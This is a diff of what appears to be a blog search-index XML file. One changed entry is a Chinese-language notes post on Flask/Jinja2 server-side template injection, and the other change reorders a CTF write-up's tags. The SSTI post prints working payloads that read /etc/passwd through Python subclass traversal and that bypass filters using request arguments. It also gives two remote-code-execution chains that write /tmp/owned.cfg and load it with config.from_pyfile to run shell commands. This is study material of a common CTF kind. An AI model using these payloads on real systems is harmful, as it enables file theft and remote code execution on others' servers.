@@ -3,7 +3,7 @@
   <entry>
     <title><![CDATA[SSTI的一些基本操作]]></title>
     <url>%2F2019%2F01%2F17%2FSSTI%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%2F</url>
-    <content type="text"><![CDATA[简介记录一下SSTI的一些基本操作，方便以后使用。主要内容转载自该博客 任意文件读取POC123file类能够实例化文件对象，而且如果我们实例化了一个文件对象，那么我们就可用使用类似于read的方法来读取相关内容。找到file类的索引，在我的环境中&lt;type 'file'&gt;类的索引是40，我们就注入&#123;&#123; ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() &#125;&#125;可以通过以下语句绕过一些过滤&#123;&#123;''[request.args.a][request.args.b][2][request.args.c]()[40]('/etc/passwd')[request.args.d]()&#125;&#125;?a=__class__&amp;b=__mro__&amp;c=__subclasses__&amp;d=read 第一种代码执行POC1234file类不仅去读文件，而且也可以向目标服务器的可写入路径中写文件，然后我们再通过SSTI漏洞第二种代码执行poc调用from_pyfile方法去compile文件并执行其中的内容。这就是一个二次进攻。将&#123;&#123; ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg', 'w').write('&lt;malicious code here&gt;'') &#125;&#125;注入到SSTI漏洞点，然后在通过注入&#123;&#123; config.from_pyfile('/tmp/owned.cfg') &#125;&#125;调用编译过程。该代码在编译时将会被执行。这就实现了远程代码执行。 第二种代码执行POC：充分地利用from_pyfile方法。123将&#123;&#123; ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') &#125;&#125;注入到SSTI漏洞点，注入&#123;&#123; config.from_pyfile('/tmp/owned.cfg') &#125;&#125;来将新的项目添加到config对象中，将&#123;&#123; config['RUNCMD']('/usr/bin/id',shell=True) &#125;&#125;注入到SSTI漏洞点。]]></content>
+    <content type="text"><![CDATA[简介记录一下SSTI的一些基本操作，方便以后使用。主要内容转载自该博客 任意文件读取POC123file类能够实例化文件对象，而且如果我们实例化了一个文件对象，那么我们就可用使用类似于read的方法来读取相关内容。找到file类的索引，在我的环境中&lt;type 'file'&gt;类的索引是40，我们就注入&#123;&#123; ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() &#125;&#125;可以通过以下语句绕过一些过滤&#123;&#123;''[request.args.a][request.args.b][2][request.args.c]()[40]('/etc/passwd')[request.args.d]()&#125;&#125;?a=__class__&amp;b=__mro__&amp;c=__subclasses__&amp;d=read 第一种代码执行POC1234file类不仅去读文件，而且也可以向目标服务器的可写入路径中写文件，然后我们再通过SSTI漏洞第二种代码执行poc调用from_pyfile方法去compile文件并执行其中的内容。这就是一个二次进攻。将&#123;&#123; ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg', 'w').write('&lt;malicious code here&gt;') &#125;&#125;注入到SSTI漏洞点，然后在通过注入&#123;&#123; config.from_pyfile('/tmp/owned.cfg') &#125;&#125;调用编译过程。该代码在编译时将会被执行。这就实现了远程代码执行。 第二种代码执行POC：充分地利用from_pyfile方法。123将&#123;&#123; ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') &#125;&#125;注入到SSTI漏洞点，注入&#123;&#123; config.from_pyfile('/tmp/owned.cfg') &#125;&#125;来将新的项目添加到config对象中，将&#123;&#123; config['RUNCMD']('/usr/bin/id',shell=True) &#125;&#125;注入到SSTI漏洞点。]]></content>
       <categories>
         <category>Web</category>
       </categories>
@@ -47,8 +47,8 @@
       </categories>
       <tags>
         <tag>CTF</tag>
-        <tag>Crypto</tag>
         <tag>Write up</tag>
+        <tag>Crypto</tag>
       </tags>
   </entry>
   <entry>
